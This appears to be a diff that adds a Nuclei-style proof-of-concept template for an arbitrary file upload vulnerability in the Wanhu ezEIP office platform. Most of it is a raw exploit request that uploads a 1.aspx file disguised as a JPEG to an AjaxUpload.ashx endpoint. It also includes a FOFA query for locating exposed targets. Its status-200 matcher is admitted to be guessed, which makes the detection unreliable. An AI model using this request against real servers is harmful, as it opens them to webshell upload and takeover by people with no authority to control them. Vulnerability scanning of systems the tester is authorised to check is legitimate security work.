@@ -1,0 +1,52 @@
+id: poc-a9320ffef83ab7d8bcbe
+info:
+  name: 万户协同办公平台ezEIP存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a9320ffef83ab7d8bcbe9880ea6c50b0
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: a9320ffef83ab7d8bcbe9880ea6c50b0
+    fofa: + fofa`app="万户网络-ezEIP"`
+http:
+- raw:
+  - 'POST /whir_system/Res/assets/js/fileinput/js/AjaxUpload.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Length: 463
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryn46FImBFEXYi9lZ2
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2502.80 Safari/537.36
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryn46FImBFEXYi9lZ2
+
+    Content-Disposition: form-data;name="txt_file"; filename="1.aspx"
+
+    Content-Type: image/jpeg
+
+
+    hello
+
+    ------WebKitFormBoundaryn46FImBFEXYi9lZ2
+
+    Content-Disposition: form-data; name="\g"
+
+
+    Upload!
+
+    ------WebKitFormBoundaryn46FImBFEXYi9lZ2--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
